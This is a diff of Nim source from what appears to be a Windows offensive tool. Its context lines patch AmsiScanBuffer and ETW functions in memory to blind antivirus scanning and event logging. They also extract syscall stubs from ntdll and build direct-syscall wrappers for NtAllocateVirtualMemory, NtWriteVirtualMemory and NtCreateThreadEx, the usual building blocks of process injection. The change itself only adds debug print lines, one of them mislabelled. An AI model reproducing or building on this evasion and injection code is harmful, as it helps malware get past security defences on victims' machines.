@@ -51,6 +51,7 @@ proc PatchAMSI()* =
     if VirtualProtect(amsiscanbuffer,size,PAGE_EXECUTE_WRITECOPY, addr oldProtect) != 0:
         copyMem(amsiscanbuffer,addr path,size)
         discard VirtualProtect(amsiscanbuffer,size,oldProtect, addr oldProtect)
+    echo "AMSI funtion activated and done!"
     
 proc PathETW()* =
     let etwFuncs = [
@@ -75,7 +76,8 @@ proc PathETW()* =
         if VirtualProtect(function,size,PAGE_EXECUTE_WRITECOPY,addr oldProtect) != 0:
             copyMem(function, addr path, size)
             discard VirtualProtect(function,size,oldProtect,addr oldProtect)
-        
+    
+    echo "AMSI funtion activated and done!"
     
 proc RVAtoRAW(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
     return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)
@@ -117,6 +119,7 @@ proc GetSyscallStub(function_name: LPCSTR, syscall_stub LPVOID) =
     #addressofName -> returns the RVA of the array of RVA whcih points to function name
     #addressofFunction -> returns the RVA of the array of RVA which points to the function code or the starting line of the function
     var stubFound: BOOL = 0
+    echo "GetSyscallStub activated !"
     for function in i..< exportDirectory.NumberOfNames:
         var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRAW(cast[DWORD_PTR](fileData)+ addressOfNames[function],rdatasection))
         var functionNameResolved: LPCSTR = cast[LPCSTR](functionNameVA)
@@ -139,6 +142,7 @@ proc makeNtAllocateVirtualMemory()* =
     discard GetSyscallStub("NtAllocateVirtualMemory",stub)
     VirtualProtect(stub,cast[SIZE_T](23),PAGE_EXECUTE_READ,addr oldProtect)
     let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](stub)
+    echo "from the makeNtAllocateVirtualMemory function and it is done !"
 
 proc makeNtWriteVirtualMemory()* =
     var oldProtect: DWORD
@@ -146,6 +150,8 @@ proc makeNtWriteVirtualMemory()* =
     discard GetSyscallStub("NtWriteVirtualMemory",stub)
     VirtualProtect(stub,cast[SIZE_T](23),PAGE_EXECUTE_READ,addr oldProtect)
     let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](stub)
+    echo "from the makeNtWriteVirtualMemory function and it is done !"
+
 
 proc makeNtCreateThreadEx()* =
     var oldProtect: DWORD
@@ -153,3 +159,4 @@ proc makeNtCreateThreadEx()* =
     discard GetSyscallStub("NtCreateThreadEx",stub)
     VirtualProtect(stub,cast[SIZE_T](23),PAGE_EXECUTE_READ,addr oldProtect)
     let NtCreateThreadEx = cast[myNtCreateThreadEx](stub)
+    echo "from the makeNtCreateThreadEx function and it is done !"
